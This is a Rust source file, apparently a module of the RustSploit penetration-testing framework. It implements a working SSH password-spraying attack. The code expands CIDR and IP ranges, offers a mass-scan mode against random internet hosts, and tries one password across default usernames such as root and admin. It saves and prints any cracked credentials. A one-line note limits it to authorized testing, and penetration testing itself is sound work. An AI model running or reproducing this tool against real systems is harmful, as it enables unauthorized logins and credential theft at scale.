//! SSH Password Spray Module
//! 
//! Based on SSHPWN framework - sprays single password across multiple targets/users.
//! Useful for avoiding account lockouts while testing common passwords.
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    collections::HashSet,
    fs::File,
    io::{BufRead, BufReader, Write},
    sync::{
        atomic::{AtomicBool, AtomicU64, Ordering},
        Arc,
    },
    time::{Duration, Instant},
};
use anyhow::Context;
use tokio::{
    sync::Semaphore,
    task::spawn_blocking,
    time::sleep,
};
use ipnetwork::IpNetwork;

use crate::utils::{cfg_prompt_yes_no, cfg_prompt_default, cfg_prompt_required};
use crate::modules::creds::utils::{is_mass_scan_target, run_mass_scan, MassScanConfig};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "SSH Password Spray".to_string(),
        description: "Sprays a single password across multiple SSH targets and usernames. Avoids account lockouts by distributing attempts across hosts with configurable concurrency and delays.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

const DEFAULT_SSH_PORT: u16 = 22;
const DEFAULT_TIMEOUT_SECS: u64 = 10;
const DEFAULT_THREADS: usize = 20;
const PROGRESS_INTERVAL_SECS: u64 = 2;

fn display_banner() {
    crate::mprintln!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    crate::mprintln!("{}", "║   SSH Password Spray                                              ║".cyan());
    crate::mprintln!("{}", "║   Spray single password across multiple targets/users             ║".cyan());
    crate::mprintln!("{}", "║                                                                   ║".cyan());
    crate::mprintln!("{}", "║   Benefits:                                                       ║".cyan());
    crate::mprintln!("{}", "║   - Avoids account lockouts                                       ║".cyan());
    crate::mprintln!("{}", "║   - Tests common passwords across many hosts                      ║".cyan());
    crate::mprintln!("{}", "║   - Efficient for large network assessments                       ║".cyan());
    crate::mprintln!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    crate::mprintln!();
}

/// Normalize target for connection
fn normalize_target(target: &str) -> String {
    let trimmed = target.trim();
    if trimmed.starts_with('[') && trimmed.contains(']') {
        trimmed.to_string()
    } else if trimmed.contains(':') && !trimmed.contains('.') {
        format!("[{}]", trimmed)
    } else {
        trimmed.to_string()
    }
}

/// Statistics tracking
struct Statistics {
    total_attempts: AtomicU64,
    successful: AtomicU64,
    failed: AtomicU64,
    errors: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful: AtomicU64::new(0),
            failed: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }
    
    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.errors.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
    
    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful.load(Ordering::Relaxed);
        let failed = self.failed.load(Ordering::Relaxed);
        let errors = self.errors.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
        
        crate::mprint!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }
    
    fn print_summary(&self) {
        crate::mprintln!();
        crate::mprintln!("{}", "=== Spray Summary ===".cyan().bold());
        crate::mprintln!("Total attempts: {}", self.total_attempts.load(Ordering::Relaxed));
        crate::mprintln!("Successful: {}", self.successful.load(Ordering::Relaxed).to_string().green());
        crate::mprintln!("Failed: {}", self.failed.load(Ordering::Relaxed));
        crate::mprintln!("Errors: {}", self.errors.load(Ordering::Relaxed));
        crate::mprintln!("Elapsed: {:.2}s", self.start_time.elapsed().as_secs_f64());
    }
}

/// Credential result
#[derive(Clone, Debug)]
pub struct SprayResult {
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: String,
}

/// Try SSH authentication
fn try_ssh_auth(host: &str, port: u16, username: &str, password: &str, timeout_secs: u64) -> Result<bool> {
    let addr = format!("{}:{}", host, port);
    
    let tcp = crate::utils::blocking_tcp_connect(
        &addr.parse()?,
        Duration::from_secs(timeout_secs),
    )?;
    
    tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)))?;
    
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp);
    sess.handshake()?;
    
    match sess.userauth_password(username, password) {
        Ok(_) => Ok(sess.authenticated()),
        Err(_) => Ok(false),
    }
}

/// Parse targets from string (CIDR, range, single IP)
fn parse_targets(spec: &str, port: u16) -> Vec<(String, u16)> {
    let mut targets = Vec::new();
    
    for s in spec.split(&[',', ' ', '\n'][..]) {
        let s = s.trim();
        if s.is_empty() {
            continue;
        }
        
        // Try CIDR
        if s.contains('/') {
            if let Ok(network) = s.parse::<IpNetwork>() {
                for ip in network.iter().take(65536) {
                    targets.push((ip.to_string(), port));
                }
                continue;
            }
        }
        
        // Try IP range (e.g., 192.168.1.1-254)
        if s.contains('-') && s.contains('.') {
            let parts: Vec<&str> = s.rsplitn(2, '.').collect();
            if parts.len() == 2 {
                if let Some((start_str, end_str)) = parts[0].split_once('-') {
                    if let (Ok(start), Ok(end)) = (start_str.parse::<u8>(), end_str.parse::<u8>()) {
                        let base = parts[1];
                        for i in start..=end {
                            targets.push((format!("{}.{}", base, i), port));
                        }
                        continue;
                    }
                }
            }
        }
        
        // Single IP/hostname
        targets.push((s.to_string(), port));
    }
    
    targets
}

/// Load list from file
fn load_list_from_file(path: &str) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    let items: Vec<String> = reader
        .lines()
        .filter_map(|l| l.ok())
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();
    Ok(items)
}

/// Main spray function
pub async fn password_spray(
    targets: Vec<(String, u16)>,
    usernames: &[String],
    password: &str,
    threads: usize,
    timeout_secs: u64,
    stop_on_success: bool,
) -> Vec<SprayResult> {
    let total = targets.len() * usernames.len();
    crate::mprintln!("{}", format!("[*] Spraying '{}' against {} targets, {} users ({} total attempts)",
        password, targets.len(), usernames.len(), total).cyan());
    if stop_on_success {
        crate::mprintln!("{}", "[*] Stop-on-success enabled: will halt after first valid credential".yellow());
    }

    let results = Arc::new(tokio::sync::Mutex::new(Vec::new()));
    let stats = Arc::new(Statistics::new());
    let semaphore = Arc::new(Semaphore::new(threads));
    let stop = Arc::new(AtomicBool::new(false));
    let success_stop = Arc::new(AtomicBool::new(false));
    
    // Progress reporter
    let stats_clone = Arc::clone(&stats);
    let stop_clone = Arc::clone(&stop);
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });
    
    // Spray tasks
    let mut handles = Vec::new();
    
    for (host, port) in targets {
        if success_stop.load(Ordering::Relaxed) {
            break;
        }
        for user in usernames {
            if success_stop.load(Ordering::Relaxed) {
                break;
            }
            let semaphore = Arc::clone(&semaphore);
            let results = Arc::clone(&results);
            let stats = Arc::clone(&stats);
            let success_stop_clone = Arc::clone(&success_stop);
            let host = host.clone();
            let user = user.clone();
            let password = password.to_string();

            let handle: tokio::task::JoinHandle<Result<()>> = tokio::spawn(async move {
                // Check if we should stop before acquiring permit
                if success_stop_clone.load(Ordering::Relaxed) {
                    return Ok(());
                }

                let _permit = semaphore.acquire().await.context("Semaphore acquisition failed")?;

                // Check again after acquiring permit
                if success_stop_clone.load(Ordering::Relaxed) {
                    return Ok(());
                }

                const MAX_RETRIES: u32 = 2;
                let mut attempt = 0u32;

                loop {
                    let host_clone = host.clone();
                    let user_clone = user.clone();
                    let pass_clone = password.clone();

                    let result = spawn_blocking(move || {
                        try_ssh_auth(&host_clone, port, &user_clone, &pass_clone, timeout_secs)
                    }).await;

                    match result {
                        Ok(Ok(true)) => {
                            stats.record_attempt(true, false);
                            let cred = SprayResult {
                                host: host.clone(),
                                port,
                                username: user.clone(),
                                password: password.clone(),
                            };
                            crate::mprintln!("\r{}", format!("[PWNED] {}:{} @ {}:{}", user, password, host, port).red().bold());
                            let _ = std::io::Write::flush(&mut std::io::stdout());
                            results.lock().await.push(cred);
                            // Persist credential to framework credential store
                            let _ = crate::cred_store::store_credential(
                                &host, port, "ssh", &user, &password,
                                crate::cred_store::CredType::Password,
                                "creds/generic/ssh_spray",
                            ).await;
                            // Signal stop if stop_on_success is enabled
                            if stop_on_success {
                                success_stop_clone.store(true, Ordering::Relaxed);
                            }
                            break;
                        }
                        Ok(Ok(false)) => {
                            stats.record_attempt(false, false);
                            break;
                        }
                        Ok(Err(_)) | Err(_) => {
                            // Connection error — retry with exponential backoff
                            if attempt < MAX_RETRIES {
                                attempt += 1;
                                // Exponential backoff: 500ms, 1000ms
                                let delay_ms = 500u64 * (1u64 << (attempt - 1));
                                sleep(Duration::from_millis(delay_ms)).await;
                                continue;
                            }
                            stats.record_attempt(false, true);
                            break;
                        }
                    }
                }
                Ok(())
            });

            handles.push(handle);
        }
    }
    
    // Wait for all tasks
    for handle in handles {
        let _ = handle.await;
    }
    
    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    // Print summary
    stats.print_summary();
    
    let results = results.lock().await;
    results.clone()
}

/// Save results to file
fn save_results(results: &[SprayResult], path: &str) -> Result<()> {
    use std::os::unix::fs::OpenOptionsExt;
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    opts.mode(0o600);
    let mut file = opts.open(path)?;
    
    writeln!(file, "# SSH Password Spray Results")?;
    writeln!(file, "# Generated by RustSploit")?;
    writeln!(file, "# Total: {} credentials found", results.len())?;
    writeln!(file)?;
    
    for result in results {
        writeln!(file, "{}:{} @ {}:{}", result.username, result.password, result.host, result.port)?;
    }
    
    crate::mprintln!("{}", format!("[+] Results saved to: {}", path).green());
    Ok(())
}

/// Default usernames to spray
const DEFAULT_USERNAMES: &[&str] = &[
    "root", "admin", "user", "administrator", "ubuntu",
    "guest", "test", "oracle", "postgres", "mysql",
];

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // Mass scan mode: random IPs or target file
    if is_mass_scan_target(target) {
        let password = cfg_prompt_required("password", "Password to spray").await?;
        if password.is_empty() {
            return Err(anyhow!("Password is required"));
        }
        let users_str = cfg_prompt_default("usernames", "Usernames (comma-separated)", "root,admin,ubuntu").await?;
        let users: Vec<String> = users_str.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        let users = Arc::new(users);
        let password = Arc::new(password);

        return run_mass_scan(target, MassScanConfig {
            protocol_name: "SSH Spray",
            default_port: 22,
            state_file: "ssh_spray_mass_state.log",
            default_output: "ssh_spray_mass_results.txt",
            default_concurrency: 200,
        }, move |ip: std::net::IpAddr, port: u16| {
            let users = users.clone();
            let password = password.clone();
            async move {
                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(5)).await {
                    return None;
                }
                let addr: std::net::SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
                for user in users.iter() {
                    let tcp = crate::utils::blocking_tcp_connect(
                        &addr,
                        std::time::Duration::from_secs(10),
                    ).ok()?;
                    let _ = tcp.set_read_timeout(Some(std::time::Duration::from_secs(10)));
                    let _ = tcp.set_write_timeout(Some(std::time::Duration::from_secs(10)));
                    let mut sess = ssh2::Session::new().ok()?;
                    sess.set_tcp_stream(tcp);
                    if sess.handshake().is_err() { continue; }
                    if sess.userauth_password(user, &password).is_ok() && sess.authenticated() {
                        let msg = format!("{}:{}:{}:{}", ip, port, user, password);
                        crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                        return Some(format!("{}\n", msg));
                    }
                }
                None
            }
        }).await;
    }

    // Get password to spray
    let password = cfg_prompt_required("password", "Password to spray").await?;
    if password.is_empty() {
        return Err(anyhow!("Password is required"));
    }
    
    // Get port
    let port: u16 = cfg_prompt_default("ssh_port", "SSH Port", "22").await?.parse().unwrap_or(DEFAULT_SSH_PORT);
    
    // Get targets
    let mut targets = Vec::new();
    
    // Add initial target
    let host = normalize_target(target);
    if !host.is_empty() {
        crate::mprintln!("{}", format!("[*] Initial target: {}", host).cyan());
        targets.extend(parse_targets(&host, port));
    }
    
    // Get additional targets
    let more_targets = cfg_prompt_default("additional_targets", "Additional targets (comma-separated, CIDR, or leave empty)", "").await?;
    if !more_targets.is_empty() {
        targets.extend(parse_targets(&more_targets, port));
    }
    
    // Load from file?
    if cfg_prompt_yes_no("load_targets_file", "Load targets from file?", false).await? {
        let file_path = cfg_prompt_required("targets_file", "File path").await?;
        if !file_path.is_empty() {
            match load_list_from_file(&file_path) {
                Ok(file_targets) => {
                    crate::mprintln!("{}", format!("[*] Loaded {} targets from file", file_targets.len()).cyan());
                    for t in file_targets {
                        targets.extend(parse_targets(&t, port));
                    }
                }
                Err(e) => {
                    crate::mprintln!("{}", format!("[-] Failed to load file: {}", e).red());
                }
            }
        }
    }
    
    // Deduplicate targets
    let unique: HashSet<_> = targets.into_iter().collect();
    let targets: Vec<_> = unique.into_iter().collect();
    
    if targets.is_empty() {
        return Err(anyhow!("No targets specified"));
    }
    
    crate::mprintln!("{}", format!("[*] Total unique targets: {}", targets.len()).cyan());
    
    // Get usernames
    let mut usernames: Vec<String> = Vec::new();
    
    if cfg_prompt_yes_no("load_usernames_file", "Load usernames from file?", false).await? {
        let file_path = cfg_prompt_required("username_file", "Username file path").await?;
        if !file_path.is_empty() {
            match load_list_from_file(&file_path) {
                Ok(loaded) => {
                    crate::mprintln!("{}", format!("[*] Loaded {} usernames from file", loaded.len()).cyan());
                    usernames.extend(loaded);
                }
                Err(e) => {
                    crate::mprintln!("{}", format!("[-] Failed to load file: {}", e).red());
                }
            }
        }
    }
    
    // Add default usernames?
    if usernames.is_empty() || cfg_prompt_yes_no("use_default_usernames", "Also test default usernames?", true).await? {
        for user in DEFAULT_USERNAMES {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
        }
    }
    
    if usernames.is_empty() {
        return Err(anyhow!("No usernames to test"));
    }
    
    // Get scan options
    let threads: usize = cfg_prompt_default("concurrency", "Concurrent threads", &DEFAULT_THREADS.to_string()).await?
        .parse()
        .unwrap_or(DEFAULT_THREADS);
    let timeout: u64 = cfg_prompt_default("timeout", "Connection timeout (seconds)", &DEFAULT_TIMEOUT_SECS.to_string()).await?
        .parse()
        .unwrap_or(DEFAULT_TIMEOUT_SECS);

    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", false).await?;

    crate::mprintln!();

    // Run spray
    let results = password_spray(targets, &usernames, &password, threads, timeout, stop_on_success).await;
    
    // Save results?
    if !results.is_empty() && cfg_prompt_yes_no("save_results", "Save results to file?", true).await? {
        let raw = cfg_prompt_default("output_file", "Output file", "ssh_spray_results.txt").await?;
        // Force basename only — no directory traversal
        let output_path = std::path::Path::new(&raw)
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "ssh_spray_results.txt".to_string());
        if output_path.is_empty() || output_path.starts_with('.') {
            crate::mprintln!("{}", "[-] Invalid output filename".red());
        } else if let Err(e) = save_results(&results, &output_path) {
            crate::mprintln!("{}", format!("[-] Failed to save: {}", e).red());
        }
    }
    
    crate::mprintln!();
    crate::mprintln!("{}", format!("[*] Password spray complete. Found {} valid credentials.", results.len()).green());
    
    Ok(())
}
